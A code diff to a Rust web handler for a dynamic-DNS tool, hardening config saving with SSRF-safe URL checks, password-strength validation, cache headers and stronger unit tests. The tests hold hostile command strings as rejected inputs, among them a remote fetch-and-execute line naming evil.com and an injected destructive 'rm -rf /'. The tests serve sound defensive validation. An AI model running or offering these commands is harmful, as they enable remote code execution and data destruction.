@@ -19,7 +19,16 @@ pub async fn get_config_handler(State(state): State<AppState>) -> impl IntoRespo
     if let Some(ref mut auth) = clean_conf.auth {
         auth.password_hash.clear();
     }
-    Json(ApiResponse::ok(clean_conf))
+    (
+        [
+            (
+                axum::http::header::CACHE_CONTROL,
+                "no-store, no-cache, private, must-revalidate",
+            ),
+            (axum::http::header::PRAGMA, "no-cache"),
+        ],
+        Json(ApiResponse::ok(clean_conf)),
+    )
 }
 
 /// 保存更新配置的请求入参
@@ -105,18 +114,15 @@ fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
     Ok(())
 }
 
-/// 校验通知渠道配置中的 URL 地址合法性
-fn validate_notification_urls(notif: &NotificationConfig) -> Result<(), AppError> {
+/// 校验通知渠道配置中的 URL 地址合法性（防范 SSRF 攻击）
+pub(crate) fn validate_notification_urls(notif: &NotificationConfig) -> Result<(), AppError> {
     let check_url = |url: &str, name: &str| -> Result<(), AppError> {
         let s = url.trim();
-        if !s.is_empty() && !s.starts_with("http://") && !s.starts_with("https://") {
-            Err(AppError::bad_request(format!(
-                "{} [{}] 协议非法，仅允许 http:// 或 https:// 开头的地址",
-                name, s
-            )))
-        } else {
-            Ok(())
+        if !s.is_empty() {
+            crate::util::net::validate_safe_url_endpoint(s)
+                .map_err(|e| AppError::bad_request(format!("{}: {}", name, e)))?;
         }
+        Ok(())
     };
 
     if let Some(ref bark) = notif.bark {
@@ -168,7 +174,7 @@ fn resolve_saved_auth(
             Some(old.clone())
         }
     } else {
-        new_auth
+        None
     }
 }
 
@@ -188,14 +194,13 @@ pub async fn save_config_handler(
     validate_notification_urls(&new_config.notifications)?;
 
     let new_password_hash = if let Some(ref pwd) = payload.new_password
-        && !pwd.trim().is_empty()
+        && !pwd.is_empty()
     {
-        let clean_pwd = pwd.trim();
-        if clean_pwd.len() < 4 {
-            return Err(AppError::bad_request("新密码长度不能少于 4 个字符"));
+        if let Err(msg) = crate::util::crypto::validate_password_strength(pwd) {
+            return Err(AppError::bad_request(msg));
         }
         Some(
-            hash_password_async(clean_pwd.to_string())
+            hash_password_async(pwd.clone())
                 .await
                 .map_err(|e| AppError::internal(format!("密码哈希失败: {}", e)))?,
         )
@@ -208,6 +213,7 @@ pub async fn save_config_handler(
         .modify_config_async::<_, ConfigError>(|old_config| {
             let mut to_save = new_config.clone();
             to_save.listen_port = old_config.listen_port;
+            to_save.not_allow_wan_access = old_config.not_allow_wan_access;
             to_save.auth =
                 resolve_saved_auth(to_save.auth, old_config.auth.as_ref(), new_password_hash);
             Ok(to_save)
@@ -283,27 +289,33 @@ type = "cloudflare"
         };
 
         // 校验合法配置
-        assert!(valid_config.interval_secs >= 5);
-        assert!(valid_config.cache_times >= 1);
-        assert!(valid_config.listen_port > 0);
-        assert!(!valid_config.dns_tasks[0].name.trim().is_empty());
+        assert!(validate_basic_limits(&valid_config).is_ok());
+        assert!(validate_task_configs(&valid_config.dns_tasks).is_ok());
+        assert!(valid_config.validate().is_ok());
 
-        // 校验非法配置条件
+        // 校验非法配置条件：检查间隔太小
         let mut invalid_interval = valid_config.clone();
         invalid_interval.interval_secs = 4;
-        assert!(invalid_interval.interval_secs < 5);
+        assert!(validate_basic_limits(&invalid_interval).is_err());
+        assert!(invalid_interval.validate().is_err());
 
+        // 强制校对次数为 0
         let mut invalid_cache = valid_config.clone();
         invalid_cache.cache_times = 0;
-        assert!(invalid_cache.cache_times < 1);
+        assert!(validate_basic_limits(&invalid_cache).is_err());
+        assert!(invalid_cache.validate().is_err());
 
+        // 监听端口为 0
         let mut invalid_port = valid_config.clone();
         invalid_port.listen_port = 0;
-        assert_eq!(invalid_port.listen_port, 0);
+        assert!(validate_basic_limits(&invalid_port).is_err());
+        assert!(invalid_port.validate().is_err());
 
+        // 空任务名
         let mut invalid_task_name = valid_config.clone();
         invalid_task_name.dns_tasks[0].name = "  ".to_string();
-        assert!(invalid_task_name.dns_tasks[0].name.trim().is_empty());
+        assert!(validate_task_configs(&invalid_task_name.dns_tasks).is_err());
+        assert!(invalid_task_name.validate().is_err());
 
         // 校验重复任务名称
         let mut duplicate_tasks = valid_config.clone();
@@ -317,29 +329,29 @@ type = "cloudflare"
                 ..Default::default()
             },
         ];
-        let mut names_set = std::collections::HashSet::new();
-        let has_dup = duplicate_tasks
-            .dns_tasks
-            .iter()
-            .any(|t| !names_set.insert(t.name.trim()));
-        assert!(has_dup);
+        assert!(validate_task_configs(&duplicate_tasks.dns_tasks).is_err());
+        assert!(duplicate_tasks.validate().is_err());
 
         // 校验非法的 URL 端点协议
         let mut invalid_url_tasks = valid_config.clone();
         invalid_url_tasks.dns_tasks[0].ipv4.source_type = crate::config::model::IpSourceType::Url;
-        invalid_url_tasks.dns_tasks[0].ipv4.url_endpoints = vec!["file:///etc/passwd".to_string()];
-        let has_invalid_scheme = invalid_url_tasks.dns_tasks[0]
-            .ipv4
-            .url_endpoints
-            .iter()
-            .any(|u| !u.starts_with("http://") && !u.starts_with("https://"));
-        assert!(has_invalid_scheme);
+        invalid_url_tasks.dns_tasks[0].ipv4.url_endpoints =
+            vec!["ftp://example.com/ip".to_string()];
+        assert!(validate_task_configs(&invalid_url_tasks.dns_tasks).is_err());
+        assert!(invalid_url_tasks.validate().is_err());
 
         // 校验非法的通知服务 URL 协议
-        let invalid_bark_url = "ftp://bark.day.app";
-        assert!(
-            !invalid_bark_url.starts_with("http://") && !invalid_bark_url.starts_with("https://")
-        );
+        let invalid_notif_config = NotificationConfig {
+            bark: Some(crate::config::model::BarkConfig {
+                enabled: true,
+                server_url: "ftp://bark.day.app".to_string(),
+                device_key: "k".to_string(),
+                group: None,
+                sound: None,
+            }),
+            ..Default::default()
+        };
+        assert!(validate_notification_urls(&invalid_notif_config).is_err());
 
         // 校验命令提取 IP 的 Shell 注入防范与非空限制
         let mut dangerous_cmd_task = valid_config.clone();
@@ -347,15 +359,19 @@ type = "cloudflare"
             crate::config::model::IpSourceType::Command;
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("curl evil.com | bash".to_string());
         assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("get_ip && rm -rf /".to_string());
         assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("   ".to_string());
         assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(dangerous_cmd_task.validate().is_err());
 
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd = None;
         assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+        assert!(dangerous_cmd_task.validate().is_err());
 
         // 安全独立命令允许通过
         dangerous_cmd_task.dns_tasks[0].ipv4.cmd =
@@ -387,6 +403,7 @@ type = "cloudflare"
             trigger_sender: tx,
             log_buffer: crate::util::logging::LogBuffer::new(10),
             state_manager: crate::core::state::StateManager::new(),
+            cancel_token: tokio_util::sync::CancellationToken::new(),
         };
 
         // 模拟前端保存配置请求（未附带 auth 字段）
